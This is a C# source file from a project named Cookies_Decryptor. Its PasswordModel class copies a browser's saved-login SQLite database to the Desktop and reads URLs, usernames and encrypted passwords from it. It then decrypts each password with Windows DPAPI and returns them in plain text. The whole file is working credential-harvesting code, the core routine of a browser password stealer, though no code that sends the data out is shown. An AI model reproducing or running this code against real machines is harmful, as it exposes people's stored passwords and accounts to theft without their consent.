using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Cookies_Decryptor
{
    internal class PasswordModel
    {
        private readonly string LoginDataPath;
        private readonly string _browserName;
        public PasswordModel(string browserName, string loginDataPath)
        {
            _browserName = browserName;
            LoginDataPath = loginDataPath;
        }
        private static byte[] GetBytes(IDataRecord reader, int columnIndex)
        {
            const int chunkSize = 2 * 1024;
            var buffer = new byte[chunkSize];
            long fieldOffset = 0;
            using (var stream = new MemoryStream())
            {
                long bytesRead;
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
        public IEnumerable<LoginData> GetLoginData()
        {
            var data = new List<LoginData>();


            var tempFile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\TempLoginData";

            File.Copy(LoginDataPath, tempFile, true);

            if (File.Exists(tempFile))
            {
                try
                {
                    using (var connection = new SQLiteConnection($"Data Source={tempFile};"))
                    {
                        connection.Open();
                        using (var command = connection.CreateCommand())
                        {
                            command.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var dataReader = command.ExecuteReader())
                            {
                                if (dataReader.HasRows)
                                {
                                    while (dataReader.Read())
                                    {
                                        var password = Encoding.UTF8.GetString(
                                            ProtectedData.Unprotect(GetBytes(dataReader, 2), null,
                                                DataProtectionScope.CurrentUser));

                                        data.Add(new LoginData()
                                        {
                                            Url = dataReader.GetString(0),
                                            Username = dataReader.GetString(1),
                                            Password = password
                                        });
                                    }
                                }
                            }
                        }

                        connection.Close();
                    }
                }
                catch (Exception e)
                {
                    throw new Exception($"Error in reading login data.. Error message : {e}");
                }
                finally
                {
                    File.Delete(tempFile);
                }


            }
            else
            {
                throw new FileNotFoundException($"{_browserName} login data is not exist. :(");
            }

            return data;
        }

    }
}
